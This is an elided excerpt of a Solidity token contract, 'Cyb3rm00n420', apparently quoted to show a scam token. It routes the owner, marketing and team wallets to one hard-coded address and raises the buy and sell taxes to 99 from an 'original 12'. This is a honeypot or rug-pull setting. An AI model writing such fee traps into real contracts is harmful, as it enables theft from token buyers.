...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xD65f8ceDa090d7034DE2cc6e18f95b1BB783140C; // owner address
...
contract Cyb3rm00n420 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Cyb3rm00n420";
    string private _symbol = "m00n";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xD65f8ceDa090d7034DE2cc6e18f95b1BB783140C); // Marketing Address
    address payable private teamWalletAddress = payable(0xD65f8ceDa090d7034DE2cc6e18f95b1BB783140C); // Team Address
    ...
    uint256 public _totalTaxIfBuying = 99;  // original 12
    uint256 public _totalTaxIfSelling = 99;  // original 12
